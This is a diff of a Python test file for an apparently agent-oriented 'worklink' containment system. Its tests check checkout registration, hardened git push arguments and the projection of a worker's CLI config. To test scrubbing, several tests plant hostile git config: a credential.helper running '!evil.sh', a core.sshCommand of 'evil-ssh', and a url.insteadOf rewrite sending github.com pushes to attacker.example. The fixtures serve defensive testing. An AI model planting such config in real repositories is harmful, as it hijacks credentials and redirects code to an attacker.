@@ -20,6 +20,25 @@ from mimir.worklink import supervisor
 from mimir.worklink.evidence import _run, _talks_to_the_remote
 
 
+@pytest.fixture(autouse=True)
+def _isolate_attempt_registry():
+    """The registry is module-level mutable state shared by the whole process.
+
+    Without this, a checkout registered by one test authorises containment in
+    another, so a test can pass on state it does not own -- and the negative
+    tests here depend on a path NOT being registered.
+    """
+    from mimir.worklink import containment
+
+    saved = set(containment._ATTEMPT_CHECKOUTS)
+    containment._ATTEMPT_CHECKOUTS.clear()
+    try:
+        yield
+    finally:
+        containment._ATTEMPT_CHECKOUTS.clear()
+        containment._ATTEMPT_CHECKOUTS.update(saved)
+
+
 @pytest.fixture
 def coding_on(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
     monkeypatch.setenv("MIMIR_CODING_ENABLED", "1")
@@ -59,6 +78,9 @@ def test_the_test_command_runs_contained(tmp_path: Path, coding_on: Path) -> Non
     """The gate's command executes what the build wrote, so it runs contained."""
     checkout = tmp_path / "repo" / ".worklink" / "441-a1"
     checkout.mkdir(parents=True)
+    from mimir.worklink.containment import register_attempt_checkout
+
+    register_attempt_checkout(checkout)
 
     import threading
 
@@ -93,6 +115,9 @@ def test_a_push_is_never_routed_into_containment(tmp_path: Path, coding_on: Path
 
     checkout = tmp_path / "repo" / ".worklink" / "441-a1"
     checkout.mkdir(parents=True)
+    from mimir.worklink.containment import register_attempt_checkout
+
+    register_attempt_checkout(checkout)
     _run(["git", "-C", str(checkout), "push", "-u", "origin", "nope"])
     assert not list(request_dir(coding_on).glob("*.json")), "push was spooled"
 
@@ -104,6 +129,9 @@ def test_evidence_steps_are_inert_without_the_coding_flag(
     monkeypatch.setenv("MIMIR_WORKLINK_SPOOL", str(tmp_path / "spool"))
     checkout = tmp_path / "repo" / ".worklink" / "441-a1"
     checkout.mkdir(parents=True)
+    from mimir.worklink.containment import register_attempt_checkout
+
+    register_attempt_checkout(checkout)
     result = _run("echo direct", cwd=checkout)
     assert result.returncode == 0
     assert "direct" in result.stdout
@@ -136,6 +164,9 @@ def test_the_injected_orchestrator_runner_routes_through_containment(
 
     checkout = tmp_path / "repo" / ".worklink" / "441-a1"
     checkout.mkdir(parents=True)
+    from mimir.worklink.containment import register_attempt_checkout
+
+    register_attempt_checkout(checkout)
     seen: list[Path | None] = []
     sentinel = sp.CompletedProcess(args=["contained"], returncode=42, stdout="via-spool", stderr="")
 
@@ -280,11 +311,15 @@ def test_push_disables_what_the_worker_owned_checkout_could_execute() -> None:
         remote_url="https://github.com/o/r.git",
     )
     argv = calls[0]
-    for setting in (
-        "core.hooksPath=/dev/null", "core.fsmonitor=", "diff.external=",
-        "core.sshCommand=ssh", "core.askpass=", "credential.helper=",
-    ):
+    for setting in ("core.hooksPath=/dev/null", "core.fsmonitor=", "diff.external="):
         assert setting in argv, f"{setting} missing from the push argv"
+    # NOT `-c credential.helper=`: an empty value RESETS git's helper list and -c
+    # wins, so it would also remove the deployment's `gh auth setup-git` helper
+    # and leave a token-free HTTPS URL with no credential. Those keys are removed
+    # from the CHECKOUT's own config instead.
+    assert "credential.helper=" not in argv, (
+        "clearing credential.helper removes the deployment's helper, not just the worker's"
+    )
     assert argv.index("push") > argv.index("-C"), "overrides must precede the subcommand"
     # NOT _MAINTENANCE_GIT_BASE_OVERRIDES wholesale: it carries
     # protocol.allow=never, which is right for local maintenance and fatal for a
@@ -319,8 +354,11 @@ def test_worker_env_drops_variables_naming_the_controller_home(
             "LANG": "en_US.UTF-8",
         },
     )
-    assert "OPENCODE_CONFIG" not in env
-    assert "CODEX_HOME" not in env
+    # They are no longer ABSENT -- they are re-pointed at worker-owned paths,
+    # because deleting them leaves the CLI with no config at all. The property
+    # that matters is that neither still names the controller's home.
+    assert str(agent_home) not in env.get("OPENCODE_CONFIG", "")
+    assert str(agent_home) not in env.get("CODEX_HOME", "")
     assert env["PATH"] == "/usr/bin:/bin"
     assert env["LANG"] == "en_US.UTF-8", "unrelated values must survive"
 
@@ -340,6 +378,9 @@ def test_the_push_oid_comes_from_the_supervisors_own_read(tmp_path: Path) -> Non
     policy = ContainmentPolicy(user="nobody", spool_root=root, verified=False)
     checkout = tmp_path / "repo" / ".worklink" / "441-a1"
     checkout.mkdir(parents=True)
+    from mimir.worklink.containment import register_attempt_checkout
+
+    register_attempt_checkout(checkout)
     import subprocess as sp
 
     for cmd in (["git", "init", "-q"], ["git", "add", "-A"]):
@@ -400,6 +441,13 @@ def test_the_hardened_push_actually_works_against_a_real_remote(tmp_path: Path) 
     git("branch", "-M", "issue/441-a1", cwd=work)
     oid = git("rev-parse", "HEAD", cwd=work).stdout.strip()
 
+    # Planted config the push must neutralise. Asserted AFTER _git_push, so
+    # removing the scrub call from the push path fails this test -- a direct
+    # test of the scrub helper alone does not.
+    git("config", "--local", "credential.helper", "!evil.sh", cwd=work)
+    git("config", "--local", "url.https://attacker.example/.insteadOf",
+        "https://github.com/", cwd=work)
+
     # A planted hook that would fail the push if hooks were honoured.
     hooks = work / ".git" / "hooks"
     hooks.mkdir(parents=True, exist_ok=True)
@@ -423,3 +471,106 @@ def test_the_hardened_push_actually_works_against_a_real_remote(tmp_path: Path) 
         cwd=remote, capture_output=True, text=True, check=False,
     ).stdout.strip()
     assert landed == oid, "the observed object is what reached the remote"
+    leftover = git("config", "--local", "--name-only", "--list", cwd=work).stdout
+    assert "credential.helper" not in leftover, f"planted helper survived the push: {leftover}"
+    assert "insteadof" not in leftover.lower(), f"planted url rewrite survived: {leftover}"
+
+
+def test_an_unregistered_worklink_path_is_declined(
+    tmp_path: Path, coding_on: Path,
+) -> None:
+    """The `.worklink` marker alone must not authorise a chown.
+
+    A configured repository sitting under some `.worklink` directory satisfies
+    the marker, and the supervisor chowns whatever cwd it is handed. Only a
+    checkout the orchestrator actually issued may cross.
+    """
+    from mimir.worklink.containment import request_dir
+    from mimir.worklink.evidence import _run
+
+    impostor = tmp_path / "elsewhere" / ".worklink" / "not-ours"
+    impostor.mkdir(parents=True)
+    _run(["git", "-C", str(impostor), "status", "--porcelain"])
+    spooled = list(request_dir(coding_on).glob("*.json"))
+    assert not spooled, f"an unregistered .worklink path was spooled: {spooled}"
+
+
+def test_a_registered_checkout_is_accepted(tmp_path: Path, coding_on: Path) -> None:
+    """The positive half, so the guard cannot pass by declining everything."""
+    from mimir.worklink.containment import register_attempt_checkout, request_dir
+    from mimir.worklink.evidence import maybe_run_contained
+
+    real = tmp_path / "repo" / ".worklink" / "441-a1"
+    real.mkdir(parents=True)
+    register_attempt_checkout(real)
+    # Submits and would wait; assert on the spool instead of blocking.
+    import threading
+
+    t = threading.Thread(
+        target=maybe_run_contained,
+        args=(["git", "-C", str(real), "status"], real, {"PATH": "/usr/bin:/bin"}),
+        daemon=True,
+    )
+    t.start()
+    t.join(timeout=3)
+    assert list(request_dir(coding_on).glob("*.json")), "a registered checkout was not spooled"
+
+
+def test_the_worker_gets_its_own_cli_config_paths(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Dropping the controller's OPENCODE_CONFIG leaves the CLI with none.
+
+    The worker cannot read the controller's copy (0600 under a 0700 home), so
+    the projection has to point somewhere it owns, not just delete the variable.
+    """
+    import pwd
+
+    from mimir.worklink.containment import ContainmentPolicy, worker_runtime_env
+
+    agent_home = tmp_path / "mimir-home"
+    agent_home.mkdir()
+    monkeypatch.setenv("MIMIR_HOME", str(agent_home))
+    policy = ContainmentPolicy(user="nobody", spool_root=tmp_path, verified=True)
+    env = worker_runtime_env(policy, {"OPENCODE_CONFIG": str(agent_home / "opencode.jsonc")})
+    worker_home = pwd.getpwnam("nobody").pw_dir
+    if not worker_home:
+        pytest.skip("no home for the test account")
+    for key in ("OPENCODE_CONFIG", "CODEX_HOME", "CLAUDE_CONFIG_DIR"):
+        assert key in env, f"{key} must be projected, not merely dropped"
+        assert env[key].startswith(worker_home), f"{key}={env[key]} is not worker-owned"
+        assert str(agent_home) not in env[key]
+
+
+def test_the_push_scrubs_worker_planted_config_from_the_checkout(tmp_path: Path) -> None:
+    """Executed, not asserted on argv.
+
+    A worker-written .git/config can redirect the push (url.*.insteadOf,
+    credential.helper) or execute during it (core.sshCommand). These are removed
+    from the CHECKOUT's config, so the deployment's own global helper survives.
+    """
+    import subprocess as sp
+
+    from mimir.worklink.orchestrator import _scrub_checkout_git_config
+
+    work = tmp_path / "repo" / ".worklink" / "441-a1"
+    work.mkdir(parents=True)
+    if sp.run(["git", "init", "-q"], cwd=work, capture_output=True, check=False).returncode != 0:
+        pytest.skip("git unavailable")
+
+    def cfg(*args: str) -> sp.CompletedProcess[str]:
+        return sp.run(["git", "-C", str(work), "config", "--local", *args],
+                      capture_output=True, text=True, check=False)
+
+    cfg("credential.helper", "!evil.sh")
+    cfg("core.sshCommand", "evil-ssh")
+    cfg("url.https://attacker.example/.insteadOf", "https://github.com/")
+    cfg("user.email", "keep@me")
+
+    _scrub_checkout_git_config(work)
+
+    assert cfg("--get", "credential.helper").stdout.strip() == ""
+    assert cfg("--get", "core.sshCommand").stdout.strip() == ""
+    listing = cfg("--name-only", "--list").stdout
+    assert "insteadof" not in listing.lower(), f"url rewrite survived: {listing}"
+    assert cfg("--get", "user.email").stdout.strip() == "keep@me", "unrelated config must survive"
